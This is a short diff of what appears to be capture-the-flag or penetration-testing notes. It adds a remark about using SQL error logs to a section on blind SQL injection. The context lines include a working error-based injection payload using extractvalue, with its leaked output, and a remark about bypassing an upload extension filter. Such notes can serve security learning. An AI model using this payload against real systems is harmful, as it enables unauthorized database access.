@@ -50,6 +50,8 @@ The server is trimming extension, but only the last one so secrets.txt.py will b
 ## breaking authentication
 (blind sqli)
 
+making use of sql error logs
+
 ```
 ' and extractvalue(1, concat(0x7e, (SELECT database()), 0x7e))-- -
 ~app~
